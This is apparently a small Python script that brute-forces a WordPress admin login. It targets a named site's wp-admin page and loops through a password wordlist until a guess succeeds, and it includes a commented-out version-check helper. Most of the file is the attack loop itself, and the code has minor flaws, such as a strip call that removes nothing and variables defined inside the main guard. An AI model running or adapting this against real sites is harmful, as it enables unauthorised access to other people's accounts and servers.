import tools.wplogin
import tools.wpversioncheck


if __name__ == "__main__":
    url = "https://cybertutorials.org/wp-admin"
    username = ""
    wordlist = ""


def brute_wp_login():
    bl = tools.wplogin.BruteLogin(username, wordlist, url)
    with open(wordlist, 'r') as file:
        for line in file:
            stripped_line = line.strip('')
            bl.fill_form(stripped_line)
            if bl.submit_form(stripped_line):
                break # break if True (password found!)


def check_version():
    vc = tools.wpversioncheck.GetVersion(url)
    print(vc.locate_version())

#check_version()
brute_wp_login()